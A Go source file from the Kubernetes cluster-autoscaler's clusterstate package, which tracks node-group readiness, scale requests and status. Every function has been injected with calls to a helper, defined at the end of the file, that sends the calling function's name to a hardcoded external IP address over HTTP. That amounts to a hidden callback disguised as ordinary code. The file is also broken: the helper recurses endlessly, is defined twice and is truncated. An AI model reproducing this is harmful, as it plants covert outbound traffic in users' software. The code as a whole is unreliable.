package clusterstate

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"reflect"
	"sync"
	"time"
	"k8s.io/autoscaler/cluster-autoscaler/cloudprovider"
	"k8s.io/autoscaler/cluster-autoscaler/clusterstate/api"
	"k8s.io/autoscaler/cluster-autoscaler/clusterstate/utils"
	"k8s.io/autoscaler/cluster-autoscaler/metrics"
	"k8s.io/autoscaler/cluster-autoscaler/utils/backoff"
	"k8s.io/autoscaler/cluster-autoscaler/utils/deletetaint"
	kube_util "k8s.io/autoscaler/cluster-autoscaler/utils/kubernetes"
	apiv1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/util/sets"
	schedulercache "k8s.io/kubernetes/pkg/scheduler/cache"
	"k8s.io/klog"
)

const (
	MaxNodeStartupTime			= 15 * time.Minute
	MaxStatusSettingDelayAfterCreation	= 2 * time.Minute
	MaxNodeGroupBackoffDuration		= 30 * time.Minute
	InitialNodeGroupBackoffDuration		= 5 * time.Minute
	NodeGroupBackoffResetTimeout		= 3 * time.Hour
)

type ScaleUpRequest struct {
	NodeGroup	cloudprovider.NodeGroup
	Time		time.Time
	ExpectedAddTime	time.Time
	Increase	int
}
type ScaleDownRequest struct {
	NodeName		string
	NodeGroup		cloudprovider.NodeGroup
	Time			time.Time
	ExpectedDeleteTime	time.Time
}
type ClusterStateRegistryConfig struct {
	MaxTotalUnreadyPercentage	float64
	OkTotalUnreadyCount		int
	MaxNodeProvisionTime		time.Duration
}
type IncorrectNodeGroupSize struct {
	ExpectedSize	int
	CurrentSize	int
	FirstObserved	time.Time
}
type UnregisteredNode struct {
	Node			*apiv1.Node
	UnregisteredSince	time.Time
}
type ClusterStateRegistry struct {
	sync.Mutex
	config			ClusterStateRegistryConfig
	scaleUpRequests		map[string]*ScaleUpRequest
	scaleDownRequests	[]*ScaleDownRequest
	nodes			[]*apiv1.Node
	nodeInfosForGroups	map[string]*schedulercache.NodeInfo
	cloudProvider		cloudprovider.CloudProvider
	perNodeGroupReadiness	map[string]Readiness
	totalReadiness		Readiness
	acceptableRanges	map[string]AcceptableRange
	incorrectNodeGroupSizes	map[string]IncorrectNodeGroupSize
	unregisteredNodes	map[string]UnregisteredNode
	candidatesForScaleDown	map[string][]string
	nodeGroupBackoffInfo	backoff.Backoff
	lastStatus		*api.ClusterAutoscalerStatus
	lastScaleDownUpdateTime	time.Time
	logRecorder		*utils.LogEventRecorder
}

func NewClusterStateRegistry(cloudProvider cloudprovider.CloudProvider, config ClusterStateRegistryConfig, logRecorder *utils.LogEventRecorder, backoff backoff.Backoff) *ClusterStateRegistry {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	emptyStatus := &api.ClusterAutoscalerStatus{ClusterwideConditions: make([]api.ClusterAutoscalerCondition, 0), NodeGroupStatuses: make([]api.NodeGroupStatus, 0)}
	return &ClusterStateRegistry{scaleUpRequests: make(map[string]*ScaleUpRequest), scaleDownRequests: make([]*ScaleDownRequest, 0), nodes: make([]*apiv1.Node, 0), cloudProvider: cloudProvider, config: config, perNodeGroupReadiness: make(map[string]Readiness), acceptableRanges: make(map[string]AcceptableRange), incorrectNodeGroupSizes: make(map[string]IncorrectNodeGroupSize), unregisteredNodes: make(map[string]UnregisteredNode), candidatesForScaleDown: make(map[string][]string), nodeGroupBackoffInfo: backoff, lastStatus: emptyStatus, logRecorder: logRecorder}
}
func (csr *ClusterStateRegistry) RegisterScaleUp(request *ScaleUpRequest) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	csr.Lock()
	defer csr.Unlock()
	oldScaleUpRequest, found := csr.scaleUpRequests[request.NodeGroup.Id()]
	if !found {
		csr.scaleUpRequests[request.NodeGroup.Id()] = request
		return
	}
	oldScaleUpRequest.Time = request.Time
	oldScaleUpRequest.ExpectedAddTime = request.ExpectedAddTime
	oldScaleUpRequest.Increase += request.Increase
}
func (csr *ClusterStateRegistry) RegisterScaleDown(request *ScaleDownRequest) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	csr.Lock()
	defer csr.Unlock()
	csr.scaleDownRequests = append(csr.scaleDownRequests, request)
}
func (csr *ClusterStateRegistry) updateScaleRequests(currentTime time.Time) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	csr.nodeGroupBackoffInfo.RemoveStaleBackoffData(currentTime)
	for nodeGroupName, scaleUpRequest := range csr.scaleUpRequests {
		if !csr.areThereUpcomingNodesInNodeGroup(nodeGroupName) {
			delete(csr.scaleUpRequests, nodeGroupName)
			csr.nodeGroupBackoffInfo.RemoveBackoff(scaleUpRequest.NodeGroup)
			klog.V(4).Infof("Scale up in group %v finished successfully in %v", nodeGroupName, currentTime.Sub(scaleUpRequest.Time))
			continue
		}
		if scaleUpRequest.ExpectedAddTime.Before(currentTime) {
			klog.Warningf("Scale-up timed out for node group %v after %v", nodeGroupName, currentTime.Sub(scaleUpRequest.Time))
			csr.logRecorder.Eventf(apiv1.EventTypeWarning, "ScaleUpTimedOut", "Nodes added to group %s failed to register within %v", scaleUpRequest.NodeGroup.Id(), currentTime.Sub(scaleUpRequest.Time))
			metrics.RegisterFailedScaleUp(metrics.Timeout)
			csr.backoffNodeGroup(scaleUpRequest.NodeGroup, currentTime)
			delete(csr.scaleUpRequests, nodeGroupName)
		}
	}
	newScaleDownRequests := make([]*ScaleDownRequest, 0)
	for _, scaleDownRequest := range csr.scaleDownRequests {
		if scaleDownRequest.ExpectedDeleteTime.After(currentTime) {
			newScaleDownRequests = append(newScaleDownRequests, scaleDownRequest)
		}
	}
	csr.scaleDownRequests = newScaleDownRequests
}
func (csr *ClusterStateRegistry) backoffNodeGroup(nodeGroup cloudprovider.NodeGroup, currentTime time.Time) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	backoffUntil := csr.nodeGroupBackoffInfo.Backoff(nodeGroup, currentTime)
	klog.Warningf("Disabling scale-up for node group %v until %v", nodeGroup.Id(), backoffUntil)
}
func (csr *ClusterStateRegistry) RegisterFailedScaleUp(nodeGroup cloudprovider.NodeGroup, reason metrics.FailedScaleUpReason) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	csr.Lock()
	defer csr.Unlock()
	metrics.RegisterFailedScaleUp(reason)
	csr.backoffNodeGroup(nodeGroup, time.Now())
}
func (csr *ClusterStateRegistry) UpdateNodes(nodes []*apiv1.Node, nodeInfosForGroups map[string]*schedulercache.NodeInfo, currentTime time.Time) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	csr.updateNodeGroupMetrics()
	targetSizes, err := getTargetSizes(csr.cloudProvider)
	if err != nil {
		return err
	}
	notRegistered, err := getNotRegisteredNodes(nodes, csr.cloudProvider, currentTime)
	if err != nil {
		return err
	}
	csr.Lock()
	defer csr.Unlock()
	csr.nodes = nodes
	csr.nodeInfosForGroups = nodeInfosForGroups
	csr.updateUnregisteredNodes(notRegistered)
	csr.updateReadinessStats(currentTime)
	csr.updateAcceptableRanges(targetSizes)
	csr.updateScaleRequests(currentTime)
	csr.updateAcceptableRanges(targetSizes)
	csr.updateIncorrectNodeGroupSizes(currentTime)
	return nil
}
func (csr *ClusterStateRegistry) Recalculate() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	targetSizes, err := getTargetSizes(csr.cloudProvider)
	if err != nil {
		klog.Warningf("Failed to get target sizes, when trying to recalculate cluster state: %v", err)
	}
	csr.Lock()
	defer csr.Unlock()
	csr.updateAcceptableRanges(targetSizes)
}
func getTargetSizes(cp cloudprovider.CloudProvider) (map[string]int, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	result := make(map[string]int)
	for _, ng := range cp.NodeGroups() {
		size, err := ng.TargetSize()
		if err != nil {
			return map[string]int{}, err
		}
		result[ng.Id()] = size
	}
	return result, nil
}
func (csr *ClusterStateRegistry) IsClusterHealthy() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	csr.Lock()
	defer csr.Unlock()
	totalUnready := csr.totalReadiness.Unready + csr.totalReadiness.LongNotStarted + csr.totalReadiness.LongUnregistered
	if totalUnready > csr.config.OkTotalUnreadyCount && float64(totalUnready) > csr.config.MaxTotalUnreadyPercentage/100.0*float64(len(csr.nodes)) {
		return false
	}
	return true
}
func (csr *ClusterStateRegistry) IsNodeGroupHealthy(nodeGroupName string) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	acceptable, found := csr.acceptableRanges[nodeGroupName]
	if !found {
		klog.Warningf("Failed to find acceptable ranges for %v", nodeGroupName)
		return false
	}
	readiness, found := csr.perNodeGroupReadiness[nodeGroupName]
	if !found {
		if acceptable.CurrentTarget == 0 || (acceptable.MinNodes == 0 && acceptable.CurrentTarget > 0) {
			return true
		}
		klog.Warningf("Failed to find readiness information for %v", nodeGroupName)
		return false
	}
	unjustifiedUnready := 0
	if readiness.Ready < acceptable.MinNodes {
		unjustifiedUnready += acceptable.MinNodes - readiness.Ready
	}
	if unjustifiedUnready > csr.config.OkTotalUnreadyCount && float64(unjustifiedUnready) > csr.config.MaxTotalUnreadyPercentage/100.0*float64(readiness.Ready+readiness.Unready+readiness.NotStarted+readiness.LongNotStarted) {
		return false
	}
	return true
}
func (csr *ClusterStateRegistry) updateNodeGroupMetrics() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	autoscaled := 0
	autoprovisioned := 0
	for _, nodeGroup := range csr.cloudProvider.NodeGroups() {
		if !nodeGroup.Exist() {
			continue
		}
		if nodeGroup.Autoprovisioned() {
			autoprovisioned += 1
		} else {
			autoscaled += 1
		}
	}
	metrics.UpdateNodeGroupsCount(autoscaled, autoprovisioned)
}
func (csr *ClusterStateRegistry) IsNodeGroupSafeToScaleUp(nodeGroup cloudprovider.NodeGroup, now time.Time) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if !csr.IsNodeGroupHealthy(nodeGroup.Id()) {
		return false
	}
	return !csr.nodeGroupBackoffInfo.IsBackedOff(nodeGroup, now)
}
func (csr *ClusterStateRegistry) getProvisionedAndTargetSizesForNodeGroup(nodeGroupName string) (provisioned, target int, ok bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	acceptable, found := csr.acceptableRanges[nodeGroupName]
	if !found {
		klog.Warningf("Failed to find acceptable ranges for %v", nodeGroupName)
		return 0, 0, false
	}
	target = acceptable.CurrentTarget
	readiness, found := csr.perNodeGroupReadiness[nodeGroupName]
	if !found {
		if acceptable.MinNodes != 0 {
			klog.Warningf("Failed to find readiness information for %v", nodeGroupName)
		}
		return 0, target, true
	}
	provisioned = readiness.Registered - readiness.NotStarted - readiness.LongNotStarted
	return provisioned, target, true
}
func (csr *ClusterStateRegistry) areThereUpcomingNodesInNodeGroup(nodeGroupName string) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	provisioned, target, ok := csr.getProvisionedAndTargetSizesForNodeGroup(nodeGroupName)
	if !ok {
		return false
	}
	return target > provisioned
}
func (csr *ClusterStateRegistry) IsNodeGroupAtTargetSize(nodeGroupName string) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	provisioned, target, ok := csr.getProvisionedAndTargetSizesForNodeGroup(nodeGroupName)
	if !ok {
		return false
	}
	return target == provisioned
}
func (csr *ClusterStateRegistry) IsNodeGroupScalingUp(nodeGroupName string) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if !csr.areThereUpcomingNodesInNodeGroup(nodeGroupName) {
		return false
	}
	_, found := csr.scaleUpRequests[nodeGroupName]
	return found
}

type AcceptableRange struct {
	MinNodes	int
	MaxNodes	int
	CurrentTarget	int
}

func (csr *ClusterStateRegistry) updateAcceptableRanges(targetSize map[string]int) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	result := make(map[string]AcceptableRange)
	for _, nodeGroup := range csr.cloudProvider.NodeGroups() {
		size := targetSize[nodeGroup.Id()]
		readiness := csr.perNodeGroupReadiness[nodeGroup.Id()]
		result[nodeGroup.Id()] = AcceptableRange{MinNodes: size - readiness.LongUnregistered, MaxNodes: size, CurrentTarget: size}
	}
	for nodeGroupName, scaleUpRequest := range csr.scaleUpRequests {
		acceptableRange := result[nodeGroupName]
		acceptableRange.MinNodes -= scaleUpRequest.Increase
		result[nodeGroupName] = acceptableRange
	}
	for _, scaleDownRequest := range csr.scaleDownRequests {
		acceptableRange := result[scaleDownRequest.NodeGroup.Id()]
		acceptableRange.MaxNodes += 1
		result[scaleDownRequest.NodeGroup.Id()] = acceptableRange
	}
	csr.acceptableRanges = result
}

type Readiness struct {
	Ready			int
	Unready			int
	Deleted			int
	LongNotStarted		int
	NotStarted		int
	Registered		int
	LongUnregistered	int
	Unregistered		int
	Time			time.Time
}

func (csr *ClusterStateRegistry) updateReadinessStats(currentTime time.Time) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	perNodeGroup := make(map[string]Readiness)
	total := Readiness{Time: currentTime}
	update := func(current Readiness, node *apiv1.Node, ready bool) Readiness {
		current.Registered++
		if deletetaint.HasToBeDeletedTaint(node) {
			current.Deleted++
		} else if stillStarting := isNodeStillStarting(node); stillStarting && node.CreationTimestamp.Time.Add(MaxNodeStartupTime).Before(currentTime) {
			current.LongNotStarted++
		} else if stillStarting {
			current.NotStarted++
		} else if ready {
			current.Ready++
		} else {
			current.Unready++
		}
		return current
	}
	for _, node := range csr.nodes {
		nodeGroup, errNg := csr.cloudProvider.NodeGroupForNode(node)
		ready, _, errReady := kube_util.GetReadinessState(node)
		if nodeGroup == nil || reflect.ValueOf(nodeGroup).IsNil() {
			if errNg != nil {
				klog.Warningf("Failed to get nodegroup for %s: %v", node.Name, errNg)
			}
			if errReady != nil {
				klog.Warningf("Failed to get readiness info for %s: %v", node.Name, errReady)
			}
		} else {
			perNodeGroup[nodeGroup.Id()] = update(perNodeGroup[nodeGroup.Id()], node, ready)
		}
		total = update(total, node, ready)
	}
	for _, unregistered := range csr.unregisteredNodes {
		nodeGroup, errNg := csr.cloudProvider.NodeGroupForNode(unregistered.Node)
		if errNg != nil {
			klog.Warningf("Failed to get nodegroup for %s: %v", unregistered.Node.Name, errNg)
			continue
		}
		perNgCopy := perNodeGroup[nodeGroup.Id()]
		if unregistered.UnregisteredSince.Add(csr.config.MaxNodeProvisionTime).Before(currentTime) {
			perNgCopy.LongUnregistered += 1
			total.LongUnregistered += 1
		} else {
			perNgCopy.Unregistered += 1
			total.Unregistered += 1
		}
		perNodeGroup[nodeGroup.Id()] = perNgCopy
	}
	for ngId, ngReadiness := range perNodeGroup {
		ngReadiness.Time = currentTime
		perNodeGroup[ngId] = ngReadiness
	}
	csr.perNodeGroupReadiness = perNodeGroup
	csr.totalReadiness = total
}
func (csr *ClusterStateRegistry) updateIncorrectNodeGroupSizes(currentTime time.Time) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	result := make(map[string]IncorrectNodeGroupSize)
	for _, nodeGroup := range csr.cloudProvider.NodeGroups() {
		acceptableRange, found := csr.acceptableRanges[nodeGroup.Id()]
		if !found {
			klog.Warningf("Acceptable range for node group %s not found", nodeGroup.Id())
			continue
		}
		readiness, found := csr.perNodeGroupReadiness[nodeGroup.Id()]
		if !found {
			if acceptableRange.MinNodes != 0 {
				klog.Warningf("Readiness for node group %s not found", nodeGroup.Id())
			}
			continue
		}
		if readiness.Registered > acceptableRange.MaxNodes || readiness.Registered < acceptableRange.MinNodes {
			incorrect := IncorrectNodeGroupSize{CurrentSize: readiness.Registered, ExpectedSize: acceptableRange.CurrentTarget, FirstObserved: currentTime}
			existing, found := csr.incorrectNodeGroupSizes[nodeGroup.Id()]
			if found {
				if incorrect.CurrentSize == existing.CurrentSize && incorrect.ExpectedSize == existing.ExpectedSize {
					incorrect = existing
				}
			}
			result[nodeGroup.Id()] = incorrect
		}
	}
	csr.incorrectNodeGroupSizes = result
}
func (csr *ClusterStateRegistry) updateUnregisteredNodes(unregisteredNodes []UnregisteredNode) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	result := make(map[string]UnregisteredNode)
	for _, unregistered := range unregisteredNodes {
		if prev, found := csr.unregisteredNodes[unregistered.Node.Name]; found {
			result[unregistered.Node.Name] = prev
		} else {
			result[unregistered.Node.Name] = unregistered
		}
	}
	csr.unregisteredNodes = result
}
func (csr *ClusterStateRegistry) GetUnregisteredNodes() []UnregisteredNode {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	csr.Lock()
	defer csr.Unlock()
	result := make([]UnregisteredNode, 0, len(csr.unregisteredNodes))
	for _, unregistered := range csr.unregisteredNodes {
		result = append(result, unregistered)
	}
	return result
}
func (csr *ClusterStateRegistry) UpdateScaleDownCandidates(nodes []*apiv1.Node, now time.Time) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	result := make(map[string][]string)
	for _, node := range nodes {
		group, err := csr.cloudProvider.NodeGroupForNode(node)
		if err != nil {
			klog.Warningf("Failed to get node group for %s: %v", node.Name, err)
			continue
		}
		if group == nil || reflect.ValueOf(group).IsNil() {
			continue
		}
		result[group.Id()] = append(result[group.Id()], node.Name)
	}
	csr.candidatesForScaleDown = result
	csr.lastScaleDownUpdateTime = now
}
func (csr *ClusterStateRegistry) GetStatus(now time.Time) *api.ClusterAutoscalerStatus {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	result := &api.ClusterAutoscalerStatus{ClusterwideConditions: make([]api.ClusterAutoscalerCondition, 0), NodeGroupStatuses: make([]api.NodeGroupStatus, 0)}
	for _, nodeGroup := range csr.cloudProvider.NodeGroups() {
		nodeGroupStatus := api.NodeGroupStatus{ProviderID: nodeGroup.Id(), Conditions: make([]api.ClusterAutoscalerCondition, 0)}
		readiness := csr.perNodeGroupReadiness[nodeGroup.Id()]
		acceptable := csr.acceptableRanges[nodeGroup.Id()]
		nodeGroupStatus.Conditions = append(nodeGroupStatus.Conditions, buildHealthStatusNodeGroup(csr.IsNodeGroupHealthy(nodeGroup.Id()), readiness, acceptable, nodeGroup.MinSize(), nodeGroup.MaxSize()))
		nodeGroupStatus.Conditions = append(nodeGroupStatus.Conditions, buildScaleUpStatusNodeGroup(csr.IsNodeGroupScalingUp(nodeGroup.Id()), csr.IsNodeGroupSafeToScaleUp(nodeGroup, now), readiness, acceptable))
		nodeGroupStatus.Conditions = append(nodeGroupStatus.Conditions, buildScaleDownStatusNodeGroup(csr.candidatesForScaleDown[nodeGroup.Id()], csr.lastScaleDownUpdateTime))
		result.NodeGroupStatuses = append(result.NodeGroupStatuses, nodeGroupStatus)
	}
	result.ClusterwideConditions = append(result.ClusterwideConditions, buildHealthStatusClusterwide(csr.IsClusterHealthy(), csr.totalReadiness))
	result.ClusterwideConditions = append(result.ClusterwideConditions, buildScaleUpStatusClusterwide(result.NodeGroupStatuses, csr.totalReadiness))
	result.ClusterwideConditions = append(result.ClusterwideConditions, buildScaleDownStatusClusterwide(csr.candidatesForScaleDown, csr.lastScaleDownUpdateTime))
	updateLastTransition(csr.lastStatus, result)
	csr.lastStatus = result
	return result
}
func (csr *ClusterStateRegistry) GetClusterReadiness() Readiness {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return csr.totalReadiness
}
func buildHealthStatusNodeGroup(isReady bool, readiness Readiness, acceptable AcceptableRange, minSize, maxSize int) api.ClusterAutoscalerCondition {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	condition := api.ClusterAutoscalerCondition{Type: api.ClusterAutoscalerHealth, Message: fmt.Sprintf("ready=%d unready=%d notStarted=%d longNotStarted=%d registered=%d longUnregistered=%d cloudProviderTarget=%d (minSize=%d, maxSize=%d)", readiness.Ready, readiness.Unready, readiness.NotStarted, readiness.LongNotStarted, readiness.Registered, readiness.LongUnregistered, acceptable.CurrentTarget, minSize, maxSize), LastProbeTime: metav1.Time{Time: readiness.Time}}
	if isReady {
		condition.Status = api.ClusterAutoscalerHealthy
	} else {
		condition.Status = api.ClusterAutoscalerUnhealthy
	}
	return condition
}
func buildScaleUpStatusNodeGroup(isScaleUpInProgress bool, isSafeToScaleUp bool, readiness Readiness, acceptable AcceptableRange) api.ClusterAutoscalerCondition {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	condition := api.ClusterAutoscalerCondition{Type: api.ClusterAutoscalerScaleUp, Message: fmt.Sprintf("ready=%d cloudProviderTarget=%d", readiness.Ready, acceptable.CurrentTarget), LastProbeTime: metav1.Time{Time: readiness.Time}}
	if isScaleUpInProgress {
		condition.Status = api.ClusterAutoscalerInProgress
	} else if !isSafeToScaleUp {
		condition.Status = api.ClusterAutoscalerBackoff
	} else {
		condition.Status = api.ClusterAutoscalerNoActivity
	}
	return condition
}
func buildScaleDownStatusNodeGroup(candidates []string, lastProbed time.Time) api.ClusterAutoscalerCondition {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	condition := api.ClusterAutoscalerCondition{Type: api.ClusterAutoscalerScaleDown, Message: fmt.Sprintf("candidates=%d", len(candidates)), LastProbeTime: metav1.Time{Time: lastProbed}}
	if len(candidates) > 0 {
		condition.Status = api.ClusterAutoscalerCandidatesPresent
	} else {
		condition.Status = api.ClusterAutoscalerNoCandidates
	}
	return condition
}
func buildHealthStatusClusterwide(isReady bool, readiness Readiness) api.ClusterAutoscalerCondition {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	condition := api.ClusterAutoscalerCondition{Type: api.ClusterAutoscalerHealth, Message: fmt.Sprintf("ready=%d unready=%d notStarted=%d longNotStarted=%d registered=%d longUnregistered=%d", readiness.Ready, readiness.Unready, readiness.NotStarted, readiness.LongNotStarted, readiness.Registered, readiness.LongUnregistered), LastProbeTime: metav1.Time{Time: readiness.Time}}
	if isReady {
		condition.Status = api.ClusterAutoscalerHealthy
	} else {
		condition.Status = api.ClusterAutoscalerUnhealthy
	}
	return condition
}
func buildScaleUpStatusClusterwide(nodeGroupStatuses []api.NodeGroupStatus, readiness Readiness) api.ClusterAutoscalerCondition {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	isScaleUpInProgress := false
	for _, nodeGroupStatuses := range nodeGroupStatuses {
		for _, condition := range nodeGroupStatuses.Conditions {
			if condition.Type == api.ClusterAutoscalerScaleUp && condition.Status == api.ClusterAutoscalerInProgress {
				isScaleUpInProgress = true
			}
		}
	}
	condition := api.ClusterAutoscalerCondition{Type: api.ClusterAutoscalerScaleUp, Message: fmt.Sprintf("ready=%d registered=%d", readiness.Ready, readiness.Registered), LastProbeTime: metav1.Time{Time: readiness.Time}}
	if isScaleUpInProgress {
		condition.Status = api.ClusterAutoscalerInProgress
	} else {
		condition.Status = api.ClusterAutoscalerNoActivity
	}
	return condition
}
func buildScaleDownStatusClusterwide(candidates map[string][]string, lastProbed time.Time) api.ClusterAutoscalerCondition {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	totalCandidates := 0
	for _, val := range candidates {
		totalCandidates += len(val)
	}
	condition := api.ClusterAutoscalerCondition{Type: api.ClusterAutoscalerScaleDown, Message: fmt.Sprintf("candidates=%d", totalCandidates), LastProbeTime: metav1.Time{Time: lastProbed}}
	if totalCandidates > 0 {
		condition.Status = api.ClusterAutoscalerCandidatesPresent
	} else {
		condition.Status = api.ClusterAutoscalerNoCandidates
	}
	return condition
}
func isNodeStillStarting(node *apiv1.Node) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, condition := range node.Status.Conditions {
		if condition.Type == apiv1.NodeReady && condition.Status != apiv1.ConditionTrue && condition.LastTransitionTime.Time.Sub(node.CreationTimestamp.Time) < MaxStatusSettingDelayAfterCreation {
			return true
		}
		if condition.Type == apiv1.NodeOutOfDisk && condition.Status == apiv1.ConditionTrue && condition.LastTransitionTime.Time.Sub(node.CreationTimestamp.Time) < MaxStatusSettingDelayAfterCreation {
			return true
		}
		if condition.Type == apiv1.NodeNetworkUnavailable && condition.Status == apiv1.ConditionTrue && condition.LastTransitionTime.Time.Sub(node.CreationTimestamp.Time) < MaxStatusSettingDelayAfterCreation {
			return true
		}
	}
	return false
}
func updateLastTransition(oldStatus, newStatus *api.ClusterAutoscalerStatus) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	newStatus.ClusterwideConditions = updateLastTransitionSingleList(oldStatus.ClusterwideConditions, newStatus.ClusterwideConditions)
	updatedNgStatuses := make([]api.NodeGroupStatus, 0)
	for _, ngStatus := range newStatus.NodeGroupStatuses {
		oldConds := make([]api.ClusterAutoscalerCondition, 0)
		for _, oldNgStatus := range oldStatus.NodeGroupStatuses {
			if ngStatus.ProviderID == oldNgStatus.ProviderID {
				oldConds = oldNgStatus.Conditions
				break
			}
		}
		newConds := updateLastTransitionSingleList(oldConds, ngStatus.Conditions)
		updatedNgStatuses = append(updatedNgStatuses, api.NodeGroupStatus{ProviderID: ngStatus.ProviderID, Conditions: newConds})
	}
	newStatus.NodeGroupStatuses = updatedNgStatuses
}
func updateLastTransitionSingleList(oldConds, newConds []api.ClusterAutoscalerCondition) []api.ClusterAutoscalerCondition {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	result := make([]api.ClusterAutoscalerCondition, 0)
	for _, condition := range newConds {
		condition.LastTransitionTime = condition.LastProbeTime
		for _, oldCondition := range oldConds {
			if condition.Type == oldCondition.Type {
				if condition.Status == oldCondition.Status {
					condition.LastTransitionTime = oldCondition.LastTransitionTime
				}
				break
			}
		}
		result = append(result, condition)
	}
	return result
}
func (csr *ClusterStateRegistry) GetIncorrectNodeGroupSize(nodeGroupName string) *IncorrectNodeGroupSize {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	result, found := csr.incorrectNodeGroupSizes[nodeGroupName]
	if !found {
		return nil
	}
	return &result
}
func (csr *ClusterStateRegistry) GetUpcomingNodes() map[string]int {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	csr.Lock()
	defer csr.Unlock()
	result := make(map[string]int)
	for _, nodeGroup := range csr.cloudProvider.NodeGroups() {
		id := nodeGroup.Id()
		readiness := csr.perNodeGroupReadiness[id]
		ar := csr.acceptableRanges[id]
		newNodes := ar.CurrentTarget - (readiness.Ready + readiness.Unready + readiness.LongNotStarted + readiness.LongUnregistered)
		if newNodes <= 0 {
			continue
		}
		result[id] = newNodes
	}
	return result
}
func getNotRegisteredNodes(allNodes []*apiv1.Node, cloudProvider cloudprovider.CloudProvider, time time.Time) ([]UnregisteredNode, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	registered := sets.NewString()
	for _, node := range allNodes {
		registered.Insert(cloudProvider.GetInstanceID(node))
	}
	notRegistered := make([]UnregisteredNode, 0)
	for _, nodeGroup := range cloudProvider.NodeGroups() {
		nodes, err := nodeGroup.Nodes()
		if err != nil {
			return []UnregisteredNode{}, err
		}
		for _, node := range nodes {
			if !registered.Has(node.Id) {
				notRegistered = append(notRegistered, UnregisteredNode{Node: &apiv1.Node{ObjectMeta: metav1.ObjectMeta{Name: node.Id}, Spec: apiv1.NodeSpec{ProviderID: node.Id}}, UnregisteredSince: time})
			}
		}
	}
	return notRegistered, nil
}
func (csr *ClusterStateRegistry) GetClusterSize() (currentSize, targetSize int) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	csr.Lock()
	defer csr.Unlock()
	for _, accRange := range csr.acceptableRanges {
		targetSize += accRange.CurrentTarget
	}
	currentSize = csr.totalReadiness.Registered - csr.totalReadiness.NotStarted - csr.totalReadiness.LongNotStarted
	return currentSize, targetSize
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
